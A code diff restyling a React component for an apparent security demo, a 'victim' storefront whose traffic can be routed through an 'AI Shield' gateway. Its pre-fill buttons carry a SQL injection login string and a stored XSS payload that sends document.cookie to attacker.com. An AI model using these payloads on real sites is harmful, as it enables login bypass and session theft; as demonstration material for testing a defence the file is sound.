@@ -6,13 +6,9 @@ import {
   ShoppingCart,
   LogIn,
   Search,
-  Star,
-  Check,
   Shield,
-  ShieldAlert,
   AlertOctagon,
   ArrowRight,
-  ExternalLink,
   MessageSquare,
 } from 'lucide-react';
 import { INITIAL_PRODUCTS, INITIAL_REVIEWS } from '../lib/mockData';
@@ -28,7 +24,7 @@ export default function StorefrontPreview() {
   const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
   const [reviews, setReviews] = useState<ProductReview[]>(INITIAL_REVIEWS);
 
-  // Login form state
+  // Login state
   const [username, setUsername] = useState<string>('');
   const [password, setPassword] = useState<string>('');
   const [loginNotification, setLoginNotification] = useState<{
@@ -37,7 +33,7 @@ export default function StorefrontPreview() {
     details?: string;
   } | null>(null);
 
-  // Review form state
+  // Review state
   const [newReviewText, setNewReviewText] = useState<string>('');
   const [newReviewRating, setNewReviewRating] = useState<number>(5);
   const [reviewNotification, setReviewNotification] = useState<{
@@ -143,7 +139,7 @@ export default function StorefrontPreview() {
   };
 
   return (
-    <div className="glass-panel" style={{ padding: '1.5rem', marginBottom: '1.5rem' }}>
+    <div className="white-card">
       {/* Route Switcher & Storefront Banner */}
       <div
         style={{
@@ -152,58 +148,56 @@ export default function StorefrontPreview() {
           alignItems: 'center',
           flexWrap: 'wrap',
           gap: '1rem',
-          paddingBottom: '1rem',
+          paddingBottom: '1.25rem',
           marginBottom: '1.25rem',
-          borderBottom: '1px solid var(--border-subtle)',
+          borderBottom: '1px solid var(--border-light)',
         }}
       >
         <div style={{ display: 'flex', alignItems: 'center', gap: '0.85rem' }}>
           <div
             style={{
-              width: '38px',
-              height: '38px',
+              width: '40px',
+              height: '40px',
               borderRadius: 'var(--radius-md)',
-              background: 'linear-gradient(135deg, rgba(16, 185, 129, 0.25), rgba(59, 130, 246, 0.25))',
+              background: 'var(--pastel-blue)',
+              color: '#0284c7',
               display: 'flex',
               alignItems: 'center',
               justifyContent: 'center',
             }}
           >
-            <ShoppingBag size={20} color="#10b981" />
+            <ShoppingBag size={20} />
           </div>
 
           <div>
-            <h2 style={{ fontSize: '1.1rem', color: '#fff', fontWeight: 700 }}>
-              Victim Application — Aurora Storefront (:8081)
+            <h2 style={{ fontSize: '1.15rem', color: 'var(--text-primary)', fontWeight: 700 }}>
+              Victim Storefront — Aurora Boutique (:8081)
             </h2>
-            <span style={{ fontSize: '0.74rem', color: 'var(--text-dim)' }}>
-              Interactive Target Environment • 2-Page E-Commerce Demonstration
+            <span style={{ fontSize: '0.74rem', color: 'var(--text-muted)' }}>
+              2-Page E-Commerce Demonstration • Live Target Application
             </span>
           </div>
         </div>
 
         {/* Protection Mode Toggle */}
         <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
-          <div
-            className="status-pill"
+          <span
+            className="hub-badge"
             style={{
-              background: useShield ? 'rgba(16, 185, 129, 0.15)' : 'rgba(239, 68, 68, 0.15)',
-              borderColor: useShield ? 'rgba(16, 185, 129, 0.4)' : 'rgba(239, 68, 68, 0.4)',
-              color: useShield ? '#6ee7b7' : '#fca5a5',
+              background: useShield ? '#dcfce7' : '#fee2e2',
+              color: useShield ? '#16a34a' : '#dc2626',
             }}
           >
-            {useShield ? <Shield size={14} /> : <AlertOctagon size={14} />}
-            <span>
-              {useShield ? 'TRAFFIC ROUTE: VIA AI SHIELD (:8080)' : 'TRAFFIC ROUTE: DIRECT UNPROTECTED (:8081)'}
-            </span>
-          </div>
+            {useShield ? <Shield size={13} /> : <AlertOctagon size={13} />}
+            <span>{useShield ? 'VIA AI SHIELD (:8080)' : 'DIRECT UNPROTECTED (:8081)'}</span>
+          </span>
 
           <button
-            className={useShield ? 'btn-danger' : 'btn-primary'}
+            className={useShield ? 'hub-btn-danger' : 'hub-btn-primary'}
             onClick={() => setUseShield(!useShield)}
-            style={{ fontSize: '0.76rem', padding: '0.4rem 0.8rem' }}
+            style={{ fontSize: '0.76rem', padding: '0.4rem 0.85rem' }}
           >
-            {useShield ? 'Switch to Direct Target (Disable Shield)' : 'Activate AI Shield Gateway'}
+            {useShield ? 'Disable Shield (Direct Target)' : 'Activate AI Shield Gateway'}
           </button>
         </div>
       </div>
@@ -216,25 +210,35 @@ export default function StorefrontPreview() {
           alignItems: 'center',
           flexWrap: 'wrap',
           gap: '1rem',
-          marginBottom: '1.25rem',
-          background: 'rgba(255, 255, 255, 0.02)',
-          padding: '0.65rem 1rem',
-          borderRadius: 'var(--radius-md)',
-          border: '1px solid var(--border-subtle)',
+          marginBottom: '1.5rem',
+          background: '#f8fafc',
+          padding: '0.75rem 1rem',
+          borderRadius: 'var(--radius-lg)',
+          border: '1px solid var(--border-light)',
         }}
       >
-        <div style={{ display: 'flex', gap: '0.45rem' }}>
+        <div style={{ display: 'flex', gap: '0.5rem' }}>
           <button
-            className={`nav-tab-btn ${currentPage === 'store' ? 'active' : ''}`}
+            className={`select-pill ${currentPage === 'store' ? 'active' : ''}`}
             onClick={() => setCurrentPage('store')}
+            style={{
+              background: currentPage === 'store' ? 'var(--accent-cyan-light)' : '#ffffff',
+              color: currentPage === 'store' ? 'var(--accent-cyan)' : 'var(--text-secondary)',
+              fontWeight: currentPage === 'store' ? 600 : 400,
+            }}
           >
             <ShoppingBag size={14} />
             <span>Storefront Catalog</span>
           </button>
 
           <button
-            className={`nav-tab-btn ${currentPage === 'login' ? 'active' : ''}`}
+            className={`select-pill ${currentPage === 'login' ? 'active' : ''}`}
             onClick={() => setCurrentPage('login')}
+            style={{
+              background: currentPage === 'login' ? 'var(--accent-cyan-light)' : '#ffffff',
+              color: currentPage === 'login' ? 'var(--accent-cyan)' : 'var(--text-secondary)',
+              fontWeight: currentPage === 'login' ? 600 : 400,
+            }}
           >
             <LogIn size={14} />
             <span>Customer Authentication / Login</span>
@@ -243,71 +247,94 @@ export default function StorefrontPreview() {
 
         <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
           {currentPage === 'store' && (
-            <div className="search-input-wrap">
-              <Search size={14} className="search-icon" />
-              <input
-                type="text"
-                placeholder="Search products..."
-                value={searchQuery}
-                onChange={(e) => setSearchQuery(e.target.value)}
-                className="search-input"
-                style={{ width: '200px' }}
-              />
-            </div>
+            <input
+              type="text"
+              placeholder="Search products..."
+              value={searchQuery}
+              onChange={(e) => setSearchQuery(e.target.value)}
+              className="hub-search-input"
+              style={{ width: '190px', padding: '0.45rem 0.85rem' }}
+            />
           )}
 
-          <div
-            className="status-pill"
-            style={{ background: 'rgba(255, 255, 255, 0.05)', color: '#fff' }}
-          >
-            <ShoppingCart size={14} color="#60a5fa" />
+          <div className="select-pill" style={{ background: '#ffffff', color: 'var(--text-primary)', fontWeight: 600 }}>
+            <ShoppingCart size={14} color="#0284c7" />
             <span>Cart: {cart.reduce((a, b) => a + b.quantity, 0)} items</span>
           </div>
         </div>
       </div>
 
-      {/* PAGE 1: STOREFRONT VIEW */}
+      {/* PAGE 1: CATALOG VIEW */}
       {currentPage === 'store' && (
         <div>
-          {/* Category Filter Chips */}
-          <div style={{ display: 'flex', gap: '0.4rem', marginBottom: '1.25rem', flexWrap: 'wrap' }}>
+          {/* Category Filters */}
+          <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '1.25rem', flexWrap: 'wrap' }}>
             {['all', 'electronics', 'clothing', 'books', 'home'].map((cat) => (
               <button
                 key={cat}
                 onClick={() => setActiveCategory(cat)}
-                className={`filter-btn ${activeCategory === cat ? 'active' : ''}`}
-                style={{ textTransform: 'capitalize' }}
+                className="select-pill"
+                style={{
+                  background: activeCategory === cat ? 'var(--accent-cyan-light)' : '#f8fafc',
+                  color: activeCategory === cat ? 'var(--accent-cyan)' : 'var(--text-secondary)',
+                  fontWeight: activeCategory === cat ? 600 : 400,
+                  textTransform: 'capitalize',
+                }}
               >
                 {cat}
               </button>
             ))}
           </div>
 
-          {/* Product Cards Grid */}
-          <div className="store-product-grid">
+          {/* Product Grid */}
+          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(240px, 1fr))', gap: '1.25rem' }}>
             {filteredProducts.map((p) => (
-              <div key={p.id} className="store-product-card">
+              <div
+                key={p.id}
+                style={{
+                  background: '#f8fafc',
+                  border: '1px solid var(--border-light)',
+                  borderRadius: 'var(--radius-lg)',
+                  padding: '1.25rem',
+                  display: 'flex',
+                  flexDirection: 'column',
+                  justifyContent: 'space-between',
+                }}
+              >
                 <div>
-                  <div className="product-image-box">{p.image}</div>
+                  <div
+                    style={{
+                      height: '110px',
+                      background: '#ffffff',
+                      borderRadius: 'var(--radius-md)',
+                      display: 'flex',
+                      alignItems: 'center',
+                      justifyContent: 'center',
+                      fontSize: '3rem',
+                      marginBottom: '0.85rem',
+                    }}
+                  >
+                    {p.image}
+                  </div>
 
-                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '0.35rem' }}>
-                    <h4 style={{ color: '#fff', fontSize: '0.92rem', fontWeight: 600 }}>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
+                    <h4 style={{ fontSize: '0.92rem', fontWeight: 600, color: 'var(--text-primary)' }}>
                       {p.name}
                     </h4>
-                    <span className="font-mono" style={{ color: '#10b981', fontWeight: 700, fontSize: '0.92rem' }}>
+                    <span className="font-mono" style={{ color: '#16a34a', fontWeight: 700, fontSize: '0.92rem' }}>
                       ${p.price.toFixed(2)}
                     </span>
                   </div>
 
-                  <p style={{ fontSize: '0.74rem', color: 'var(--text-muted)', lineHeight: '1.4', marginBottom: '0.75rem' }}>
+                  <p style={{ fontSize: '0.74rem', color: 'var(--text-secondary)', lineHeight: 1.4, marginBottom: '0.75rem' }}>
                     {p.description}
                   </p>
                 </div>
 
-                <div style={{ display: 'flex', gap: '0.45rem', marginTop: '0.75rem' }}>
+                <div style={{ display: 'flex', gap: '0.5rem', marginTop: '0.75rem' }}>
                   <button
-                    className="btn-primary"
-                    style={{ flex: 1, padding: '0.45rem 0.65rem' }}
+                    className="hub-btn-primary"
+                    style={{ flex: 1, padding: '0.45rem 0.65rem', justifyContent: 'center' }}
                     onClick={() => addToCart(p)}
                   >
                     <ShoppingCart size={13} />
@@ -315,10 +342,10 @@ export default function StorefrontPreview() {
                   </button>
 
                   <button
-                    className="btn-secondary"
+                    className="hub-btn-secondary"
                     style={{ padding: '0.45rem 0.65rem' }}
                     onClick={() => setSelectedProduct(p)}
-                    title="View reviews and customer feedback"
+                    title="Reviews & feedback"
                   >
                     <MessageSquare size={13} />
                   </button>
@@ -331,40 +358,40 @@ export default function StorefrontPreview() {
 
       {/* PAGE 2: LOGIN VIEW (With SQLi Demo Sandbox) */}
       {currentPage === 'login' && (
-        <div style={{ maxWidth: '520px', margin: '0 auto', padding: '1.5rem 0' }}>
+        <div style={{ maxWidth: '480px', margin: '0 auto', padding: '1rem 0' }}>
           <div
             style={{
-              background: '#0a0f1d',
-              border: '1px solid var(--border-subtle)',
+              background: '#f8fafc',
+              border: '1px solid var(--border-light)',
               borderRadius: 'var(--radius-xl)',
               padding: '2rem',
             }}
           >
-            <h3 style={{ fontSize: '1.25rem', color: '#fff', marginBottom: '0.35rem', textAlign: 'center' }}>
-              Aurora Storefront Sign In
+            <h3 style={{ fontSize: '1.25rem', color: 'var(--text-primary)', marginBottom: '0.35rem', textAlign: 'center' }}>
+              Aurora Boutique Sign In
             </h3>
-            <p style={{ fontSize: '0.76rem', color: 'var(--text-dim)', textAlign: 'center', marginBottom: '1.5rem' }}>
-              Authentication endpoint: <span className="font-mono" style={{ color: '#93c5fd' }}>POST /api/login</span>
+            <p style={{ fontSize: '0.76rem', color: 'var(--text-muted)', textAlign: 'center', marginBottom: '1.5rem' }}>
+              Authentication endpoint: <span className="font-mono" style={{ color: '#0284c7' }}>POST /api/login</span>
             </p>
 
-            {/* Quick Demo Pre-fill Buttons */}
+            {/* Quick Demo Pre-fill */}
             <div
               style={{
                 marginBottom: '1.25rem',
-                padding: '0.75rem',
-                background: 'rgba(255, 255, 255, 0.02)',
-                border: '1px solid var(--border-subtle)',
+                padding: '0.85rem',
+                background: '#ffffff',
+                border: '1px solid var(--border-light)',
                 borderRadius: 'var(--radius-md)',
               }}
             >
-              <div style={{ fontSize: '0.72rem', color: 'var(--text-dim)', marginBottom: '0.45rem', textTransform: 'uppercase' }}>
+              <div style={{ fontSize: '0.72rem', color: 'var(--text-muted)', marginBottom: '0.45rem', textTransform: 'uppercase' }}>
                 Quick Demo Scenario Fill:
               </div>
               <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap' }}>
                 <button
                   type="button"
-                  className="btn-secondary"
-                  style={{ fontSize: '0.72rem', padding: '0.35rem 0.65rem' }}
+                  className="hub-btn-secondary"
+                  style={{ fontSize: '0.72rem', padding: '0.3rem 0.65rem' }}
                   onClick={() => {
                     setUsername('user1');
                     setPassword('password123');
@@ -375,8 +402,8 @@ export default function StorefrontPreview() {
 
                 <button
                   type="button"
-                  className="btn-danger"
-                  style={{ fontSize: '0.72rem', padding: '0.35rem 0.65rem' }}
+                  className="hub-btn-danger"
+                  style={{ fontSize: '0.72rem', padding: '0.3rem 0.65rem' }}
                   onClick={() => {
                     setUsername("admin' OR '1'='1' --");
                     setPassword('anything');
@@ -389,7 +416,7 @@ export default function StorefrontPreview() {
 
             <form onSubmit={handleLoginSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
               <div>
-                <label style={{ display: 'block', fontSize: '0.76rem', color: 'var(--text-muted)', marginBottom: '0.35rem' }}>
+                <label style={{ display: 'block', fontSize: '0.76rem', color: 'var(--text-secondary)', marginBottom: '0.35rem' }}>
                   Username / Identifier
                 </label>
                 <input
@@ -397,14 +424,14 @@ export default function StorefrontPreview() {
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
                   placeholder="e.g. admin' OR '1'='1' --"
-                  className="search-input font-mono"
-                  style={{ width: '100%', padding: '0.55rem 0.75rem' }}
+                  className="hub-search-input font-mono"
+                  style={{ width: '100%', paddingLeft: '1rem' }}
                   required
                 />
               </div>
 
               <div>
-                <label style={{ display: 'block', fontSize: '0.76rem', color: 'var(--text-muted)', marginBottom: '0.35rem' }}>
+                <label style={{ display: 'block', fontSize: '0.76rem', color: 'var(--text-secondary)', marginBottom: '0.35rem' }}>
                   Password
                 </label>
                 <input
@@ -412,23 +439,22 @@ export default function StorefrontPreview() {
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   placeholder="Enter password"
-                  className="search-input font-mono"
-                  style={{ width: '100%', padding: '0.55rem 0.75rem' }}
+                  className="hub-search-input font-mono"
+                  style={{ width: '100%', paddingLeft: '1rem' }}
                   required
                 />
               </div>
 
               <button
                 type="submit"
-                className={useShield ? 'btn-primary' : 'btn-danger'}
+                className={useShield ? 'hub-btn-primary' : 'hub-btn-danger'}
                 style={{ padding: '0.65rem', justifyContent: 'center', marginTop: '0.5rem' }}
               >
-                <span>{useShield ? 'Authenticate through AI Shield (:8080)' : 'Submit Direct to Vulnerable Backend (:8081)'}</span>
+                <span>{useShield ? 'Sign In through AI Shield (:8080)' : 'Submit Direct to Backend (:8081)'}</span>
                 <ArrowRight size={14} />
               </button>
             </form>
 
-            {/* Notification Result Box */}
             {loginNotification && (
               <div
                 style={{
@@ -437,15 +463,15 @@ export default function StorefrontPreview() {
                   borderRadius: 'var(--radius-md)',
                   background:
                     loginNotification.type === 'shield_blocked'
-                      ? 'rgba(16, 185, 129, 0.15)'
+                      ? '#ecfdf5'
                       : loginNotification.type === 'success'
-                      ? 'rgba(59, 130, 246, 0.15)'
-                      : 'rgba(239, 68, 68, 0.2)',
+                      ? '#f0f9ff'
+                      : '#fef2f2',
                   border: `1px solid ${
                     loginNotification.type === 'shield_blocked'
                       ? '#10b981'
                       : loginNotification.type === 'success'
-                      ? '#3b82f6'
+                      ? '#0284c7'
                       : '#ef4444'
                   }`,
                 }}
@@ -456,17 +482,17 @@ export default function StorefrontPreview() {
                     fontSize: '0.82rem',
                     color:
                       loginNotification.type === 'shield_blocked'
-                        ? '#6ee7b7'
+                        ? '#16a34a'
                         : loginNotification.type === 'success'
-                        ? '#93c5fd'
-                        : '#fca5a5',
+                        ? '#0284c7'
+                        : '#dc2626',
                     marginBottom: '0.25rem',
                   }}
                 >
                   {loginNotification.message}
                 </div>
                 {loginNotification.details && (
-                  <p style={{ fontSize: '0.74rem', color: '#e2e8f0', lineHeight: 1.4 }}>
+                  <p style={{ fontSize: '0.74rem', color: 'var(--text-secondary)', lineHeight: 1.4 }}>
                     {loginNotification.details}
                   </p>
                 )}
@@ -476,53 +502,56 @@ export default function StorefrontPreview() {
         </div>
       )}
 
-      {/* Product Reviews & Stored XSS Modal */}
+      {/* Review Modal */}
       {selectedProduct && (
-        <div className="modal-overlay" onClick={() => setSelectedProduct(null)}>
-          <div className="modal-card" style={{ maxWidth: '640px' }} onClick={(e) => e.stopPropagation()}>
-            <h3 style={{ fontSize: '1.1rem', color: '#fff', marginBottom: '0.25rem' }}>
+        <div className="hub-modal-overlay" onClick={() => setSelectedProduct(null)}>
+          <div className="hub-modal-card" style={{ maxWidth: '580px' }} onClick={(e) => e.stopPropagation()}>
+            <h3 style={{ fontSize: '1.1rem', color: 'var(--text-primary)', marginBottom: '0.25rem' }}>
               Customer Reviews — {selectedProduct.name}
             </h3>
-            <p style={{ fontSize: '0.74rem', color: 'var(--text-dim)', marginBottom: '1rem' }}>
-              Endpoint: <span className="font-mono" style={{ color: '#93c5fd' }}>POST /api/products/{selectedProduct.id}/reviews</span>
+            <p style={{ fontSize: '0.74rem', color: 'var(--text-muted)', marginBottom: '1rem' }}>
+              Endpoint: <span className="font-mono" style={{ color: '#0284c7' }}>POST /api/products/{selectedProduct.id}/reviews</span>
             </p>
 
-            {/* Submit New Review Form */}
             <form onSubmit={handleReviewSubmit} style={{ marginBottom: '1.25rem' }}>
-              <div style={{ marginBottom: '0.65rem' }}>
-                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.35rem' }}>
-                  <label style={{ fontSize: '0.74rem', color: 'var(--text-muted)' }}>Write a Review</label>
-                  <button
-                    type="button"
-                    className="btn-danger"
-                    style={{ fontSize: '0.68rem', padding: '2px 6px' }}
-                    onClick={() =>
-                      setNewReviewText(
-                        "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>Incredible item!"
-                      )
-                    }
-                  >
-                    ⚡ Paste XSS Cookie Stealer
-                  </button>
-                </div>
-                <textarea
-                  value={newReviewText}
-                  onChange={(e) => setNewReviewText(e.target.value)}
-                  placeholder="Share your customer experience or test XSS payload..."
-                  rows={3}
-                  className="search-input font-mono"
-                  style={{ width: '100%', padding: '0.55rem', resize: 'vertical' }}
-                  required
-                />
+              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.35rem' }}>
+                <label style={{ fontSize: '0.74rem', color: 'var(--text-secondary)' }}>Write a Review</label>
+                <button
+                  type="button"
+                  className="hub-btn-danger"
+                  style={{ fontSize: '0.68rem', padding: '2px 8px' }}
+                  onClick={() =>
+                    setNewReviewText(
+                      "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>Great gear!"
+                    )
+                  }
+                >
+                  ⚡ Paste XSS Cookie Stealer
+                </button>
               </div>
 
-              <button
-                type="submit"
-                className={useShield ? 'btn-primary' : 'btn-danger'}
-                style={{ padding: '0.45rem 0.85rem' }}
-              >
-                <span>{useShield ? 'Post Review through Shield' : 'Post Directly (Vulnerable)'}</span>
-              </button>
+              <textarea
+                value={newReviewText}
+                onChange={(e) => setNewReviewText(e.target.value)}
+                placeholder="Share customer review or test XSS payload..."
+                rows={3}
+                className="hub-search-input font-mono"
+                style={{ width: '100%', padding: '0.65rem', borderRadius: 'var(--radius-md)', resize: 'vertical' }}
+                required
+              />
+
+              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '0.65rem' }}>
+                <button
+                  type="submit"
+                  className={useShield ? 'hub-btn-primary' : 'hub-btn-danger'}
+                >
+                  <span>{useShield ? 'Submit Review through Shield' : 'Submit Direct (Vulnerable)'}</span>
+                </button>
+
+                <button type="button" className="hub-btn-secondary" onClick={() => setSelectedProduct(null)}>
+                  Close
+                </button>
+              </div>
             </form>
 
             {reviewNotification && (
@@ -531,14 +560,9 @@ export default function StorefrontPreview() {
                   padding: '0.65rem 0.85rem',
                   borderRadius: 'var(--radius-sm)',
                   marginBottom: '1rem',
-                  background:
-                    reviewNotification.type === 'shield_blocked'
-                      ? 'rgba(16, 185, 129, 0.15)'
-                      : 'rgba(239, 68, 68, 0.15)',
-                  border: `1px solid ${
-                    reviewNotification.type === 'shield_blocked' ? '#10b981' : '#ef4444'
-                  }`,
-                  color: reviewNotification.type === 'shield_blocked' ? '#6ee7b7' : '#fca5a5',
+                  background: reviewNotification.type === 'shield_blocked' ? '#ecfdf5' : '#fef2f2',
+                  border: `1px solid ${reviewNotification.type === 'shield_blocked' ? '#10b981' : '#ef4444'}`,
+                  color: reviewNotification.type === 'shield_blocked' ? '#16a34a' : '#dc2626',
                   fontSize: '0.76rem',
                   fontWeight: 600,
                 }}
@@ -547,36 +571,25 @@ export default function StorefrontPreview() {
               </div>
             )}
 
-            {/* Existing Reviews */}
-            <div style={{ maxHeight: '240px', overflowY: 'auto' }}>
+            <div style={{ maxHeight: '220px', overflowY: 'auto' }}>
               {reviews.map((r) => (
                 <div
                   key={r.id}
                   style={{
                     padding: '0.75rem',
-                    background: 'rgba(255, 255, 255, 0.02)',
+                    background: '#f8fafc',
                     borderRadius: 'var(--radius-sm)',
                     marginBottom: '0.5rem',
-                    border: '1px solid var(--border-subtle)',
+                    border: '1px solid var(--border-light)',
                   }}
                 >
                   <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.25rem' }}>
-                    <span style={{ color: '#fff', fontSize: '0.8rem', fontWeight: 600 }}>
-                      {r.username || 'Customer'}
-                    </span>
-                    <span style={{ color: '#f59e0b', fontSize: '0.75rem' }}>{'★'.repeat(r.rating)}</span>
+                    <span style={{ fontSize: '0.8rem', fontWeight: 600 }}>{r.username || 'Customer'}</span>
+                    <span style={{ color: '#eab308', fontSize: '0.75rem' }}>{'★'.repeat(r.rating)}</span>
                   </div>
-                  <p style={{ color: '#cbd5e1', fontSize: '0.76rem', wordBreak: 'break-all' }}>
-                    {r.comment}
-                  </p>
+                  <p style={{ color: 'var(--text-secondary)', fontSize: '0.76rem' }}>{r.comment}</p>
                 </div>
               ))}
-            </div>
-
-            <div style={{ textAlign: 'right', marginTop: '1rem' }}>
-              <button className="btn-secondary" onClick={() => setSelectedProduct(null)}>
-                Close
-              </button>
             </div>
           </div>
         </div>
